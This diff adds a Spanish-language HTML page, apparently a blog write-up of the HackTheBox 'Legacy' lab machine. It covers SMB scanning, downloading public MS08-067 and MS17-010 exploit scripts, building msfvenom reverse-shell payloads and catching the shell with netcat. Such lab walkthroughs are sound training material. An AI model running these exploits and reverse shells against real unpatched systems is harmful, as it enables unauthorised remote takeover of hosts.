@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="es" data-bs-theme="dark">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>HTB - Legacy | cat4clysm</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" />
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css" rel="stylesheet" />
+  <link href="../style.css" rel="stylesheet" />
+  <link href="writeup.css" rel="stylesheet" />
+</head>
+<body>
+  <nav class="navbar navbar-dark fixed-top" id="mainNav">
+    <div class="container">
+      <a class="navbar-brand fw-bold text-danger" href="../index.html">&gt;_ cat4clysm</a>
+      <a href="../index.html#writeups" class="btn btn-sm btn-outline-secondary"><i class="bi bi-arrow-left"></i> Volver</a>
+    </div>
+  </nav>
+  <main class="container py-5 mt-5">
+    <div class="writeup-header p-4 rounded mb-4">
+      <div class="d-flex flex-wrap gap-2 mb-3">
+        <span class="badge bg-danger fs-6">HackTheBox</span>
+        <span class="badge bg-success fs-6">Easy</span>
+        <span class="badge bg-secondary">Windows</span>
+        <span class="badge bg-secondary">SMB</span>
+        <span class="badge bg-secondary">MS08-067</span>
+        <span class="badge bg-secondary">MS17-010</span>
+      </div>
+      <h1 class="text-white fw-bold mb-1">Legacy</h1>
+      <p class="text-secondary mb-3">Windows XP vulnerable a MS08-067 y MS17-010; explotacion directa a SYSTEM sin autenticacion previa.</p>
+      <div class="d-flex flex-wrap gap-3 text-secondary small">
+        <span><i class="bi bi-person"></i> cat4clysm</span>
+      </div>
+    </div>
+    <div class="mb-4">
+      <h5 class="text-danger border-left-red mb-3"><i class="bi bi-tools"></i> Herramientas utilizadas</h5>
+      <div class="d-flex flex-wrap gap-2">
+        <span class="badge bg-dark border border-secondary p-2">nmap</span>
+        <span class="badge bg-dark border border-secondary p-2">searchsploit</span>
+        <span class="badge bg-dark border border-secondary p-2">msfvenom</span>
+        <span class="badge bg-dark border border-secondary p-2">netcat</span>
+      </div>
+    </div>
+        <section class="mb-5">
+      <h4 class="text-info border-left-info mb-3"><i class="bi bi-search"></i> Scanning</h4>
+      <div class="code-block mb-3">
+        <div class="code-header"><span class="text-success">root@kali</span><span class="text-white">:~$</span></div>
+        <pre><code>nmap -sC -sV -p139,445 -n -Pn 10.10.10.4 -oN targeted</code></pre>
+      </div><img src="img/htb-legacy/182516.png" class="img-fluid rounded mb-3 border border-secondary" alt="nmap scan">
+      
+    </section>
+    <section class="mb-5">
+      <h4 class="text-info border-left-info mb-3"><i class="bi bi-hdd-network"></i> Enumeracion SMB</h4>
+      <div class="code-block mb-3">
+        <div class="code-header"><span class="text-success">root@kali</span><span class="text-white">:~$</span></div>
+        <pre><code>smbmap -H 10.10.10.4
+smbclient -N -L //10.10.10.4
+nmap -p445 10.10.10.4 --script="smb-vuln*" -Pn</code></pre>
+      </div><img src="img/htb-legacy/182243.png" class="img-fluid rounded mb-3 border border-secondary" alt="smb vuln">
+      
+    </section>
+    <section class="mb-5">
+      <h4 class="text-danger border-left-danger mb-3"><i class="bi bi-lightning-charge"></i> Explotacion - MS08-067</h4>
+      <div class="code-block mb-3">
+        <div class="code-header"><span class="text-success">root@kali</span><span class="text-white">:~$</span></div>
+        <pre><code>wget https://raw.githubusercontent.com/jivoi/pentest/master/exploit_win/ms08-067.py</code></pre>
+      </div><div class="code-block mb-3">
+        <div class="code-header"><span class="text-success">root@kali</span><span class="text-white">:~$</span></div>
+        <pre><code>msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.15 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f python -v shellcode -a x86 --platform windows</code></pre>
+      </div><div class="code-block mb-3">
+        <div class="code-header"><span class="text-success">root@kali</span><span class="text-white">:~$</span></div>
+        <pre><code>python ms08-067.py 10.10.10.4 6 445
+nc -lvp 443</code></pre>
+      </div>
+    </section>
+    <section class="mb-5">
+      <h4 class="text-danger border-left-danger mb-3"><i class="bi bi-lightning-charge"></i> Alternativa - MS17-010</h4>
+      <div class="code-block mb-3">
+        <div class="code-header"><span class="text-success">root@kali</span><span class="text-white">:~$</span></div>
+        <pre><code>wget https://raw.githubusercontent.com/helviojunior/MS17-010/master/send_and_execute.py</code></pre>
+      </div><div class="code-block mb-3">
+        <div class="code-header"><span class="text-success">root@kali</span><span class="text-white">:~$</span></div>
+        <pre><code>msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.15 LPORT=8888 EXITFUNC=thread -f exe -a x86 --platform windows -o shell.exe</code></pre>
+      </div><div class="code-block mb-3">
+        <div class="code-header"><span class="text-success">root@kali</span><span class="text-white">:~$</span></div>
+        <pre><code>python send_and_execute.py 10.10.10.4 shell.exe</code></pre>
+      </div><img src="img/htb-legacy/200837.png" class="img-fluid rounded mb-3 border border-secondary" alt="whoami system">
+      
+    </section>
+    <section class="mb-5">
+      <h4 class="text-success border-left-success mb-3"><i class="bi bi-lightbulb"></i> Lecciones aprendidas</h4>
+      <ul class="text-secondary"><li>Windows XP sin parchear es vulnerable tanto a MS08-067 como a MS17-010.</li>
+<li>nmap --script smb-vuln* es suficiente para identificar vulnerabilidades criticas en SMB.</li>
+<li>Editar el shellcode en exploits Python es una tecnica fundamental para personalizar payloads.</li></ul>
+    </section>
+  </main>
+  <footer class="py-4 text-center border-top border-secondary">
+    <p class="text-secondary mb-0"><span class="text-danger">&gt;_</span> cat4clysm &copy; 2025 &nbsp;&#183;&nbsp;<span class="text-muted">Hack the planet.</span></p>
+  </footer>
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+</html>
